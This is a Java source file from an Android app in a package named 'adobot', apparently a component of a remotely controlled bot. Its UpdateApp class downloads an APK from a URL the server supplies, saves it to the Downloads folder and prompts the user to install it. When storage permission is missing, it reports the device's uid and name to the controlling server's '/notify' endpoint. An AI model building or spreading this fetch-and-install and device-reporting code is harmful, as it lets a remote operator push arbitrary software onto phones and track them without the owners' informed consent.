package buddy.ap.com.adobot;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;

import http.Http;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class UpdateApp extends AsyncTask<String, Void, Void> {
    private static final String TAG = "UpdateApp";
    public static final String PKG_FILE = "update.apk";
    private Client client;

    public void setClient(Client c) {
        this.client = c;
    }

    @Override
    protected Void doInBackground(String... arg0) {

        if (ContextCompat.checkSelfPermission(client, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {

            try {
                URL url = new URL(arg0[0]);
                URLConnection c = url.openConnection();
                c.connect();

                File file = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                file.mkdirs();
                File outputFile = new File(file, PKG_FILE);
                if (outputFile.exists()) {
                    outputFile.delete();
                }
                FileOutputStream fos = new FileOutputStream(outputFile);

                InputStream is = new BufferedInputStream(url.openStream());

                byte[] buffer = new byte[1024];
                int len1 = 0;
                while ((len1 = is.read(buffer)) != -1) {
                    fos.write(buffer, 0, len1);
                }
                fos.flush();
                fos.close();
                is.close();

                Log.i(TAG, "Download Complete!!!!!");

                Intent updateIntent = new Intent(client, PromptUpdateActivity.class);
                updateIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                client.startActivity(updateIntent);

//
//                File apkFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), PKG_FILE);
//
//
//                Intent intent = new Intent(Intent.ACTION_VIEW);
//                intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
//                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // without this flag android returned a intent error!
//                client.getApplicationContext().startActivity(intent);


            } catch (Exception e) {
                Log.e("UpdateAPP", "Update error! " + e.getMessage());
            }
        } else {
            Log.i(TAG, "No WRITE_EXTERNAL_STORAGE permission!!!");
            HashMap noPermit = new HashMap();
            noPermit.put("event", "nopermission");
            noPermit.put("uid", client.getUid());
            noPermit.put("device", client.getDevice());
            noPermit.put("permission", "WRITE_EXTERNAL_STORAGE");
            Http doneSMS = new Http();
            doneSMS.setUrl(client.SERVER + "/notify");
            doneSMS.setMethod("POST");
            doneSMS.setParams(noPermit);
            doneSMS.execute();
        }
        return null;
    }
}